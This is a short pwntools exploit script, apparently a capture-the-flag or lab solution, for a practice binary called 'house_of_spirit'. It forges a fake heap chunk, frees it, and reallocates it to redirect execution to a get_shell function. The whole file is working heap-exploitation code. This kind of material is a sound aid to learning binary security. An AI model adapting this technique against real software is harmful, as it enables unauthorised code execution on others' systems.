from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './house_of_spirit'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True
context.arch = elf.arch

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Data: ", data)

def delete(addr):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b"Addr: ", str(addr).encode())

def exit():
    p.sendlineafter(b'> ', b'3')

p.recvuntil(b'name: ')
p.send(b'a'*0x8 + p64(0x40))
fake_chunk_addr = int(p.recv(14).decode(),16) + 0x10
info('fake_chunk_addr: ' + hex(fake_chunk_addr))
create(1, b'a')
delete(fake_chunk_addr)
create(0x30, cyclic(0x30-8)+p64(elf.symbols['get_shell']))
exit()
p.interactive()

